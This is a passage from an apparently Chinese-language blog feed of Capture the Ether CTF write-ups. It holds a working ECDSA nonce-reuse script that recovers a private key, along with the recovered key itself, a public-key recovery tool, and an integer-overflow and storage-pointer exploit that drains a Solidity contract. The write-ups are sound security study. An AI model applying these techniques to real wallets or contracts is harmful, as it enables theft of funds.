href="#analyses-amp-solutions" class="headerlink" title="analyses&amp;solutions"></a>analyses&amp;solutions</h2><p>构造器名字写错了，可以随便调用方法重置owner</p>]]></content>
      
      
      <categories>
          
          <category> 01.Capturetheether CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>15.Account Takeover</title>
      <link href="/2023/06/23/01.Capturetheether%20CTF/15.Account%20Takeover/"/>
      <url>/2023/06/23/01.Capturetheether%20CTF/15.Account%20Takeover/</url>
      
        <content type="html"><![CDATA[<h1 id="Account-Takeover"><a href="#Account-Takeover" class="headerlink" title="Account Takeover"></a>Account Takeover</h1><h2 id="topic"><a href="#topic" class="headerlink" title="topic"></a>topic</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract AccountTakeoverChallenge &#123;</span><br><span class="line">    address owner = 0x6B477781b0e68031109f21887e6B5afEAaEB002b;</span><br><span class="line">    bool public isComplete;</span><br><span class="line"></span><br><span class="line">    function authenticate() public &#123;</span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line"></span><br><span class="line">        isComplete = true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="analyses"><a href="#analyses" class="headerlink" title="analyses"></a>analyses</h2><p>本道题是要找到owner的私钥，也就是部署这个合约的用户的私钥。因为ropsten测试网已经停用了，但是根据其他的解题文章，我们知道，在此测试网中，头两笔交易使用了相同的随机数k生成了相同的r值(vrs中的r)，这就出问题了：</p><ul><li><p>每一个交易都可以解析出vrs，并且r必须是不同的，它是由随机数k来生成的，否则使用重复的r会被推导出私钥，让我们来写脚本来破解此题</p><ul><li><p>r：两笔交易相同的r</p></li><li><p>s：s1和s2分别是两笔交易的s</p></li><li><p>z：根据脚本获得</p></li></ul></li></ul><p>然后根据脚本来解析反推私钥</p><p>本题主要是学习根据相同的r可以反推私钥，并且积累脚本代码，具体的数学和密码学逻辑过于复杂，我暂时没能力去自己造轮子，所以，共勉</p><h2 id="solution"><a href="#solution" class="headerlink" title="solution"></a>solution</h2><p>1.获取头两笔交易的详情：</p><p><img src="/2023/06/23/01.Capturetheether%20CTF/15.Account%20Takeover/image-20230323163029515.png" alt="image-20230323163029515"></p><p>2.获得z</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">EthereumTx</span> = <span class="built_in">require</span>(<span class="string">&#x27;ethereumjs-tx&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> rawTx1 =  </span><br><span class="line">    &#123; <span class="attr">nonce</span>: <span class="number">0</span>,  </span><br><span class="line">     <span class="attr">gasPrice</span>: <span class="string">&#x27;0x3b9aca00&#x27;</span>,  </span><br><span class="line">     <span class="attr">gasLimit</span>: <span class="string">&#x27;0x5208&#x27;</span>,  </span><br><span class="line">     <span class="attr">to</span>: <span class="string">&#x27;0x92b28647ae1f3264661f72fb2eb9625a89d88a31&#x27;</span>,  </span><br><span class="line">     <span class="attr">value</span>: <span class="string">&#x27;0x1111d67bb1bb0000&#x27;</span>,  </span><br><span class="line">     <span class="attr">data</span>: <span class="string">&#x27;0x&#x27;</span>,  </span><br><span class="line">     <span class="attr">v</span>: <span class="number">41</span>,  </span><br><span class="line">     <span class="attr">r</span>: <span class="string">&#x27;0x69a726edfb4b802cbf267d5fd1dabcea39d3d7b4bf62b9eeaeba387606167166&#x27;</span>,  </span><br><span class="line">     <span class="attr">s</span>: <span class="string">&#x27;0x7724cedeb923f374bef4e05c97426a918123cc4fec7b07903839f12517e1b3c8&#x27;</span>  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">var</span> rawTx2 =  </span><br><span class="line">    &#123; <span class="attr">nonce</span>: <span class="number">1</span>,  </span><br><span class="line">     <span class="attr">gasPrice</span>: <span class="string">&#x27;0x3b9aca00&#x27;</span>,  </span><br><span class="line">     <span class="attr">gasLimit</span>: <span class="string">&#x27;0x5208&#x27;</span>,  </span><br><span class="line">     <span class="attr">to</span>: <span class="string">&#x27;0x92b28647ae1f3264661f72fb2eb9625a89d88a31&#x27;</span>,  </span><br><span class="line">     <span class="attr">value</span>: <span class="string">&#x27;0x1922e95bca330e00&#x27;</span>,  </span><br><span class="line">     <span class="attr">data</span>: <span class="string">&#x27;0x&#x27;</span>,  </span><br><span class="line">     <span class="attr">v</span>: <span class="number">41</span>,  </span><br><span class="line">     <span class="attr">r</span>: <span class="string">&#x27;0x69a726edfb4b802cbf267d5fd1dabcea39d3d7b4bf62b9eeaeba387606167166&#x27;</span>,  </span><br><span class="line">     <span class="attr">s</span>: <span class="string">&#x27;0x2bbd9c2a6285c2b43e728b17bda36a81653dd5f4612a2e0aefdb48043c5108de&#x27;</span>  </span><br><span class="line">&#125;  </span><br><span class="line">tx1 = <span class="keyword">new</span> <span class="title class_">EthereumTx</span>(rawTx1,&#123; <span class="attr">chain</span>: <span class="string">&#x27;ropsten&#x27;</span>&#125;);  </span><br><span class="line">  </span><br><span class="line">tx2 = <span class="keyword">new</span> <span class="title class_">EthereumTx</span>(rawTx2,&#123; <span class="attr">chain</span>: <span class="string">&#x27;ropsten&#x27;</span>&#125;);  </span><br><span class="line">  </span><br><span class="line">z1=tx1.<span class="title function_">hash</span>(<span class="literal">false</span>).<span class="title function_">toString</span>(<span class="string">&quot;hex&quot;</span>);  </span><br><span class="line">z2=tx2.<span class="title function_">hash</span>(<span class="literal">false</span>).<span class="title function_">toString</span>(<span class="string">&quot;hex&quot;</span>);  </span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(z1);  </span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(z2);</span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">350f3ee8007d817fbd7349c477507f923c4682b3e69bd1df5fbb93b39beb1e04 // z1</span><br><span class="line">4f6a8370a435a27724bbc163419042d71b6dcbeb61c060cc6816cda93f57860c // z2</span><br></pre></td></tr></table></figure><p>3.反推私钥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">r = <span class="number">0x69a726edfb4b802cbf267d5fd1dabcea39d3d7b4bf62b9eeaeba387606167166</span></span><br><span class="line">z1 = <span class="number">0x4f6a8370a435a27724bbc163419042d71b6dcbeb61c060cc6816cda93f57860c</span></span><br><span class="line">s1 = <span class="number">0x2bbd9c2a6285c2b43e728b17bda36a81653dd5f4612a2e0aefdb48043c5108de</span></span><br><span class="line">z2 = <span class="number">0x350f3ee8007d817fbd7349c477507f923c4682b3e69bd1df5fbb93b39beb1e04</span></span><br><span class="line">s2 = <span class="number">0x7724cedeb923f374bef4e05c97426a918123cc4fec7b07903839f12517e1b3c8</span></span><br><span class="line"></span><br><span class="line">n  = <span class="number">0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modinv</span>(<span class="params">x, n=n</span>): <span class="keyword">return</span> <span class="built_in">pow</span>(x, n-<span class="number">2</span>, n)  <span class="comment"># modular multiplicative inverse (requires that n is prime)</span></span><br><span class="line"></span><br><span class="line">k = (z1 - z2) * modinv(s1 - s2) % n ; <span class="built_in">print</span>(<span class="string">&#x27;k = &#123;:x&#125;&#x27;</span>.<span class="built_in">format</span>(k))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;privkey = &#123;:x&#125;&#x27;</span>.<span class="built_in">format</span>( (s1 * k - z1) * modinv(r) % n ))  <span class="comment"># these two should</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;privkey = &#123;:x&#125;&#x27;</span>.<span class="built_in">format</span>( (s2 * k - z2) * modinv(r) % n ))  <span class="comment"># be the same</span></span><br></pre></td></tr></table></figure><p>得到私钥：<code>614f5e36cd55ddab0947d1723693fef5456e5bee24738ba90bd33c0c6e68e269</code></p><p>4.用此私钥导入metamask钱包，用此用户就可以调用isComplete()方法了</p>]]></content>
      
      
      <categories>
          
          <category> 01.Capturetheether CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>14.Public Key</title>
      <link href="/2023/06/23/01.Capturetheether%20CTF/14.Public%20Key/"/>
      <url>/2023/06/23/01.Capturetheether%20CTF/14.Public%20Key/</url>
      
        <content type="html"><![CDATA[<h1 id="Public-Key"><a href="#Public-Key" class="headerlink" title="Public Key"></a>Public Key</h1><h2 id="topic"><a href="#topic" class="headerlink" title="topic"></a>topic</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract PublicKeyChallenge &#123;</span><br><span class="line">    address owner = 0x92b28647ae1f3264661f72fb2eb9625a89d88a31;</span><br><span class="line">    bool public isComplete;</span><br><span class="line"></span><br><span class="line">    function authenticate(bytes publicKey) public &#123;</span><br><span class="line">        require(address(keccak256(publicKey)) == owner);</span><br><span class="line"></span><br><span class="line">        isComplete = true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="analyses"><a href="#analyses" class="headerlink" title="analyses"></a>analyses</h2><p>这道题是要我们找到地址owner的公钥，owner本题默认是合约部署人的地址。意思就是说，我们要找到合约部署人的公钥。值得注意的是，metamask只能获得私钥和地址，无法直接获取公钥</p><p>以下是私钥、公钥、地址之间的关系：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Public Key = ECDSA(Private Key)</span><br><span class="line">A = Keccak-256(Public Key)</span><br><span class="line">Address = &#x27;0x&#x27; + last 20 bytes of A</span><br></pre></td></tr></table></figure><p>回到本题，需要寻找公钥。因为在以太坊交易中，每一笔交易transaction hash可以解析出vrs，进而可以用ECDSA算法还原出公钥。因此，我们找到部署此合约的那笔交易transaction hash，然后推导出公钥即可</p><p>因为此靶场的测试网已经弃用了，因此我想在goerli测试网还原此题目，题目修改成如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract PublicKeyChallenge &#123;</span><br><span class="line">    address owner = 0xd3E65149C212902749D49011B6ab24bba30D97c6;</span><br><span class="line">    bool public isComplete;</span><br><span class="line"></span><br><span class="line">    function authenticate(bytes publicKey) public &#123;</span><br><span class="line">        require(address(keccak256(publicKey)) == owner);</span><br><span class="line"></span><br><span class="line">        isComplete = true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="solution"><a href="#solution" class="headerlink" title="solution"></a>solution</h2><p>1.部署题目：transaction hash = 0x60605c7e3fddd2be1fa63f4fa8ef12bfc5e5c69062c6a4788d1277e007e7de02</p><p>2.想要根据transaction hash还原出公钥，可以用这个工具代码(别人造的轮子)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">GetPublicKeyByTransactionHash</span>(<span class="params">self, TransactionHash: <span class="built_in">str</span></span>) -&gt; <span class="built_in">tuple</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    通过一笔已在链上确认的交易哈希，获取账户公钥。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    参数：</span></span><br><span class="line"><span class="string">        TransactionHash (str): 交易哈希</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    返回值：</span></span><br><span class="line"><span class="string">        (Address, PublicKey) (tuple): 由账户地址和账户公钥组成的元组。当出现异常时返回 None 。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">from</span> eth_account._utils.signing <span class="keyword">import</span> to_standard_v, extract_chain_id, serializable_unsigned_transaction_from_dict</span><br><span class="line"></span><br><span class="line">        Transaction = self.Eth.get_transaction(TransactionHash)</span><br><span class="line">        Signature = self.Eth.account._keys.Signature(vrs=(to_standard_v(extract_chain_id(Transaction.v)[<span class="number">1</span>]), Web3.to_int(Transaction.r), Web3.to_int(Transaction.s)))</span><br><span class="line">        UnsignedTransactionDict = &#123;i: Transaction[i] <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="string">&#x27;chainId&#x27;</span>, <span class="string">&#x27;nonce&#x27;</span>, <span class="string">&#x27;gasPrice&#x27;</span> <span class="keyword">if</span> Transaction.<span class="built_in">type</span> != <span class="number">2</span> <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;gas&#x27;</span>, <span class="string">&#x27;to&#x27;</span>, <span class="string">&#x27;value&#x27;</span>, <span class="string">&#x27;accessList&#x27;</span>, <span class="string">&#x27;maxFeePerGas&#x27;</span>, <span class="string">&#x27;maxPriorityFeePerGas&#x27;</span>] <span class="keyword">if</span> i <span class="keyword">in</span> Transaction&#125;</span><br><span class="line">        UnsignedTransactionDict[<span class="string">&#x27;data&#x27;</span>] = Transaction[<span class="string">&#x27;input&#x27;</span>]</span><br><span class="line">        UnsignedTransaction = serializable_unsigned_transaction_from_dict(UnsignedTransactionDict)</span><br><span class="line">        Temp = Signature.recover_public_key_from_msg_hash(UnsignedTransaction.<span class="built_in">hash</span>())</span><br><span class="line">        <span class="comment">#PublicKey = str(Temp).replace(&#x27;0x&#x27;, &#x27;0x04&#x27;)  # 比特币未压缩公钥格式</span></span><br><span class="line">        PublicKey = <span class="built_in">str</span>(Temp)</span><br><span class="line">        Address = Temp.to_checksum_address()</span><br><span class="line">        logger.success(</span><br><span class="line">            <span class="string">f&quot;\n[Chain][GetPublicKeyByTransactionHash]\n[TransactionHash] <span class="subst">&#123;TransactionHash&#125;</span>\n[Address] <span class="subst">&#123;Address&#125;</span>\n[PublicKey] <span class="subst">&#123;PublicKey&#125;</span>\n<span class="subst">&#123;<span class="string">&#x27;-&#x27;</span>*<span class="number">80</span>&#125;</span>&quot;</span></span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">return</span> (Address, PublicKey)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        ExceptionInformation = format_exc()</span><br><span class="line">        logger.error(</span><br><span class="line">            <span class="string">f&quot;\n[Chain][GetPublicKeyByTransactionHash]Failed\n[TransactionHash]<span class="subst">&#123;TransactionHash&#125;</span>\n[ExceptionInformation]<span class="subst">&#123;ExceptionInformation&#125;</span><span class="subst">&#123;<span class="string">&#x27;-&#x27;</span>*<span class="number">80</span>&#125;</span>&quot;</span></span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br></pre></td></tr></table></figure><p>3.然后还原出我的公钥：0x57bffa5cd5803fb0f50dc86d9b1c51c08d9679a42fbc2e3f6c6d0f0d24150989103adbe5f8c032597501a8aa33837ea74dda3571cf4ced21eb9336308a98988d</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">2023-03-21 22:51:47.309 | SUCCESS  | __main__:__init__:35 - </span><br><span class="line">[Chain][Initialize]Connected to [https://goerli.infura.io/v3/zzzzzzzzzzzzzz] [1518 ms]</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">2023-03-21 22:51:49.651 | SUCCESS  | __main__:GetBasicInformation:57 - </span><br><span class="line">[Chain][GetBasicInformation]</span><br><span class="line">[ChainId]5</span><br><span class="line">[BlockNumber]8693699</span><br><span class="line">[GasPrice]216.92452905 Gwei</span><br><span class="line">[Timeslot]12s</span><br><span class="line">[ClientVersion]Geth/v1.11.4-omnibus-8c089133/linux-amd64/go1.19.7</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">2023-03-21 22:51:50.053 | SUCCESS  | __main__:GetPublicKeyByTransactionHash:87 - </span><br><span class="line">[Chain][GetPublicKeyByTransactionHash]</span><br><span class="line">[TransactionHash]0x60605c7e3fddd2be1fa63f4fa8ef12bfc5e5c69062c6a4788d1277e007e7de02</span><br><span class="line">[Address]0xd3E65149C212902749D49011B6ab24bba30D97c6</span><br><span class="line">[PublicKey]0x57bffa5cd5803fb0f50dc86d9b1c51c08d9679a42fbc2e3f6c6d0f0d24150989103adbe5f8c032597501a8aa33837ea74dda3571cf4ced21eb9336308a98988d</span><br><span class="line">--------------------------------------------------------------------------------</span><br></pre></td></tr></table></figure><p>4.调用authenticate()即可完成本题</p>]]></content>
      
      
      <categories>
          
          <category> 01.Capturetheether CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>13.Fuzzy identity</title>
      <link href="/2023/06/23/01.Capturetheether%20CTF/13.Fuzzy%20identity/"/>
      <url>/2023/06/23/01.Capturetheether%20CTF/13.Fuzzy%20identity/</url>
      
        <content type="html"><![CDATA[<h1 id="Fuzzy-identity"><a href="#Fuzzy-identity" class="headerlink" title="Fuzzy identity"></a>Fuzzy identity</h1><h2 id="topic"><a href="#topic" class="headerlink" title="topic"></a>topic</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">interface IName &#123;</span><br><span class="line">    function name() external view returns (bytes32);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract FuzzyIdentityChallenge &#123;</span><br><span class="line">    bool public isComplete;</span><br><span class="line"></span><br><span class="line">    function authenticate() public &#123;</span><br><span class="line">        require(isSmarx(msg.sender));</span><br><span class="line">        require(isBadCode(msg.sender));</span><br><span class="line"></span><br><span class="line">        isComplete = true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isSmarx(address addr) internal view returns (bool) &#123;</span><br><span class="line">        return IName(addr).name() == bytes32(&quot;smarx&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isBadCode(address _addr) internal pure returns (bool) &#123;</span><br><span class="line">        bytes20 addr = bytes20(_addr);</span><br><span class="line">        bytes20 id = hex&quot;000000000000000000000000000000000badc0de&quot;;</span><br><span class="line">        bytes20 mask = hex&quot;000000000000000000000000000000000fffffff&quot;;</span><br><span class="line"></span><br><span class="line">        for (uint256 i = 0; i &lt; 34; i++) &#123;</span><br><span class="line">            if (addr &amp; mask == id) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">            mask &lt;&lt;= 4;</span><br><span class="line">            id &lt;&lt;= 4;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="analyses"><a href="#analyses" class="headerlink" title="analyses"></a>analyses</h2><p>the same as the article in my blog: [security-04]</p><h2 id="solution"><a href="#solution" class="headerlink" title="solution"></a>solution</h2><p>the same as the article in my blog: [security-04]</p>]]></content>
      
      
      <categories>
          
          <category> 01.Capturetheether CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>12.Fifty years</title>
      <link href="/2023/06/23/01.Capturetheether%20CTF/12.Fifty%20years/"/>
      <url>/2023/06/23/01.Capturetheether%20CTF/12.Fifty%20years/</url>
      
        <content type="html"><![CDATA[<h1 id="Fifty-years"><a href="#Fifty-years" class="headerlink" title="Fifty years"></a>Fifty years</h1><h2 id="topic"><a href="#topic" class="headerlink" title="topic"></a>topic</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract FiftyYearsChallenge &#123;</span><br><span class="line">    struct Contribution &#123;</span><br><span class="line">        uint256 amount;</span><br><span class="line">        uint256 unlockTimestamp;</span><br><span class="line">    &#125;</span><br><span class="line">    Contribution[] queue;</span><br><span class="line">    uint256 head;</span><br><span class="line"></span><br><span class="line">    address owner;</span><br><span class="line">    function FiftyYearsChallenge(address player) public payable &#123;</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line"></span><br><span class="line">        owner = player;</span><br><span class="line">        queue.push(Contribution(msg.value, now + 50 years));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance == 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function upsert(uint256 index, uint256 timestamp) public payable &#123;</span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line"></span><br><span class="line">        if (index &gt;= head &amp;&amp; index &lt; queue.length) &#123;</span><br><span class="line">            // Update existing contribution amount without updating timestamp.</span><br><span class="line">            Contribution storage contribution = queue[index];</span><br><span class="line">            contribution.amount += msg.value;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            // Append a new contribution. Require that each contribution unlock</span><br><span class="line">            // at least 1 day after the previous one.</span><br><span class="line">            require(timestamp &gt;= queue[queue.length - 1].unlockTimestamp + 1 days);</span><br><span class="line"></span><br><span class="line">            contribution.amount = msg.value;</span><br><span class="line">            contribution.unlockTimestamp = timestamp;</span><br><span class="line">            queue.push(contribution);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint256 index) public &#123;</span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line">        require(now &gt;= queue[index].unlockTimestamp);</span><br><span class="line"></span><br><span class="line">        // Withdraw this and any earlier contributions.</span><br><span class="line">        uint256 total = 0;</span><br><span class="line">        for (uint256 i = head; i &lt;= index; i++) &#123;</span><br><span class="line">            total += queue[i].amount;</span><br><span class="line"></span><br><span class="line">            // Reclaim storage.</span><br><span class="line">            delete queue[i];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // Move the head of the queue forward so we don&#x27;t have to loop over</span><br><span class="line">        // already-withdrawn contributions.</span><br><span class="line">        head = index + 1;</span><br><span class="line"></span><br><span class="line">        msg.sender.transfer(total);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="analyses-amp-solution"><a href="#analyses-amp-solution" class="headerlink" title="analyses&amp;solution"></a>analyses&amp;solution</h2><p>本关要求合约余额等于0，分析代码，我们知道要调用<code>withdraw()</code>提款来完成本题，本题考察旧版本编译器的结构体指针问题，跟11关Donate的原理差不多：upsert()中的 <code>contribution.amount</code> 和 <code>contribution.unlockTimestamp</code> 的赋值可以分别覆盖掉 queue数组的长度 和 head 变量的存储插槽：slot 0 和slot 1。</p><p>upsert()方法的逻辑是要么给某个contribution投票，要么自己新建一个contribution。但是新建由如下要求：新提案的解锁时间要大于上一个提案的解锁时间1天时间。但是我们发现，本题的编译器版本小于0.8.0，并且没有做任何整数溢出的防范措施，因此我们可以在这里搞一个整数溢出的漏洞：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">require(timestamp &gt;= queue[queue.length - 1].unlockTimestamp + 1 days);</span><br></pre></td></tr></table></figure><p>1.新建一个提案A，解锁时间设置为：2^256 - 24 <em> 60 </em> 60 = unlockTimestamp_1：2^256即0，+1days即24 <em> 60 </em> 60。那么这样，下一个提案来的时候，至少大于的解锁时间就会变成0，那么新提案的解锁时间就可以设置为0。因此第一次调用upsert()，参数为index=1，timestamp=unlockTimestamp_1，msg.value=0 Wei</p><p>2.新建提案B，解锁时间设置为0，它可以通过require的检验：第二次调用upsert()，参数为index=2，timestamp=0，msg.value=0 Wei</p><p>3.调用 withdraw 函数， 输入 index = 2，取出合约中的钱，但是，当我们调用  withdraw 函数的时候，会发现调用失败</p><p>4.分析失败的原因：withdraw()取钱的逻辑是遍历所有的提案，获取记录的amount总额，然后发钱。但是问题出在这里：queue.length 和 amount 是占据的同一块slot的，所以当 queue.length 增加的时候 amount 的值也会增加，即当我们 index 等于 1 时，queue 数组进行了 push 操作，queue.length 增加了 1，所以 amount 也加了 1，即 1 wei，所以当我们调用 withdraw 函数时，要取出的钱大于合约中有的钱，就会报错。<br>我们实际的合约金额为1.000000000000000000ETH，但是我们要取的金额为1.000000000000000002 ETH，那我们怎么办呢？其中一种做法就是写一个自毁合约，来给目标合约转 2 wei 就可以了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td 